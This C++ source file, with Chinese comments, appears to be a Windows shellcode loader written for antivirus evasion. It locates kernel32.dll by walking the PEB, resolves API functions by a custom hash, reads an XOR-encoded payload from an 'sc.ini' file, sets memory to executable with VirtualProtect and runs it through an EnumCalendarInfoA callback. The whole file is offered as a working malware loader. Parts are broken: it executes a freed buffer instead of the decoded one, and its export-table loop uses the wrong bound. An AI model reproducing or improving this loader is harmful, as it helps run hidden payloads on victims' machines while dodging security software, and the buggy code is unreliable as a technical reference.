#define _CRT_SECURE_NO_DEPRECATE
#include<iostream>
#include<Windows.h>
#include<WinBase.h>
#include<stdlib.h>
using namespace std;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING;

struct LDR_MODULE {
	LIST_ENTRY e[3];
	HMODULE base;
	void* entry;
	UINT size;
	UNICODE_STRING dllPath;
	UNICODE_STRING dllname;
};

typedef HMODULE(WINAPI* fnGetModuleHandleA)(
	LPCSTR lpModuleName
	);

typedef FARPROC(WINAPI* fnGetProcAddress)(
	HMODULE hModule,
	LPCSTR  lpProcName
	);

typedef BOOL(WINAPI* EnumInfo)(
	CALINFO_ENUMPROCA	proc,
	LCID				Eocale,
	CALID				Calender,
	CALTYPE				Type
	);

typedef BOOL(WINAPI* Exchange_)(
	LPVOID		lpAddress,
	SIZE_T		DWsIZE,
	DWORD		New,
	PDWORD		Old
	);

typedef FARPROC(WINAPI* GetFuncAddr_)(
	HMODULE hmod,
	LPCSTR  lpName
	);


typedef UINT(WINAPI* GetfileInt)(
	LPCSTR			LPAPPNAME,
	LPCSTR			KEYNAME,
	INT				DEFINE,
	LPCSTR			FILENAME
	);

DWORD calcMyHash(char* data) {
	DWORD hash = 0x35;
	for (int i = 0; i < strlen(data); i++) {
		hash += data[i] + (hash << 1);
	}
	return hash;
}

static DWORD calcMyHashBase(LDR_MODULE* mdll) {
	char name[64];
	size_t i = 0;

	while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) {
		name[i] = (char)mdll->dllname.Buffer[i];
		i++;
	}
	name[i] = 0;
	return calcMyHash((char*)CharLowerA(name));
}

//从内存中获取Kernel32.dll的基地址
static HMODULE getKernel32(DWORD myHash) {
	HMODULE kernel32;

	// 获取PEB结构地址（在x64位系统中的偏移量，32位不同）
	INT_PTR peb = __readgsqword(0x60);

	auto modList = 0x18; // PEB_LDR_DATA结构中模块列表偏移量
	auto modListFlink = 0x18; // LDR_DATA_TABLE_ENTRY结构中下一个模块的偏移量
	auto kernelBaseAddr = 0x10; // LDR_DATA_TABLE_ENTRY结构中映像基地址的偏移量

	// 获取PEB_LDR_DATA结构中的模块列表指针
	auto mdllist = *(INT_PTR*)(peb + modList);

	// 获取第一个模块的LDR_DATA_TABLE_ENTRY结构中的下一个模块的指针
	auto mlink = *(INT_PTR*)(mdllist + modListFlink);

	// 获取kernel32.dll的基地址
	auto krnbase = *(INT_PTR*)(mlink + kernelBaseAddr);

	auto mdl = (LDR_MODULE*)mlink;

	// 遍历模块列表，查找kernel32.dll模块
	do {
		mdl = (LDR_MODULE*)mdl->e[0].Flink; // 获取下一个模块的LDR_MODULE结构指针
		if (mdl->base != nullptr) { // 确认模块的基地址不为空
			if (calcMyHashBase(mdl) == myHash) { // 比较模块基地址的hash值是否与目标值相同，即找到了kernel32.dll
				break;
			}
		}
	} while (mlink != (INT_PTR)mdl); // 如果遍历到的模块指针等于最开始的指针，则已遍历完整个模块列表

	kernel32 = (HMODULE)mdl->base; // 将kernel32.dll模块的基地址保存在kernel32变量中
	return kernel32;
}

//列出kernel32.dll中的api函数，计算hash与传入的目标hash对比
static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
	PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
	PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
		(LPBYTE)h + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
	PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
	PWORD  fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);

	for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
		LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);

		if (calcMyHash(pFuncName) == myHash) {
			printf("successfully found! %s - %d\n", pFuncName, myHash);
			return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
		}
	}
	return nullptr;
}

HMODULE mod = getKernel32(56369259);
fnGetModuleHandleA myGetModuleHandleA = (fnGetModuleHandleA)getAPIAddr(mod, 4038080516);
fnGetProcAddress myGetProcAddress = (fnGetProcAddress)getAPIAddr(mod, 448915681);

HMODULE hk32 = myGetModuleHandleA("kernel32.dll");

GetfileInt GetFileIntA = (GetfileInt)myGetProcAddress(
	hk32,"GetPrivateProfileIntA"
);
Exchange_ exchange_ = (Exchange_)myGetProcAddress(
	hk32,"VirtualProtect"
);

EnumInfo EnumInfoA = (EnumInfo)myGetProcAddress(
	hk32,"EnumCalendarInfoA"
);

void decode() {
	char buf[3000];
	unsigned int bt[3000];
	CHAR PATH[MAX_PATH];
	GetCurrentDirectoryA(
		MAX_PATH, PATH
	);
	cout << PATH;
	strcat(PATH, "\\sc.ini");
	cout << PATH;
	for (int i = 0; i < 3000; i++) {
		_itoa_s(i, buf, 10);
		UINT k = GetFileIntA(
			"key",
			buf, NULL, PATH
		);
		bt[i] = k;
	}
	cout << endl;
	unsigned char* a = (unsigned char*)malloc(sizeof(bt));
	free(a);
	unsigned char* b = (unsigned char*)malloc(sizeof(bt));
	for (int i = 0; i < (sizeof(bt) / sizeof(bt[0])); i++) {
		b[i] = (unsigned char)(bt[i] ^ 1024);
	}
	for (size_t i = 0; i < (sizeof(bt) / sizeof(bt[0])); ++i) {
		std::cout << std::hex << (int)b[i] << " ";
	}
	DWORD p;
	exchange_(
		a, sizeof(a), 0x40, &p
	);
	EnumInfoA(
		(CALINFO_ENUMPROCA)a, LOCALE_SYSTEM_DEFAULT, ENUM_ALL_CALENDARS, CAL_ICALINTVALUE
	);
}

int main() {

	decode();

	return 0;
}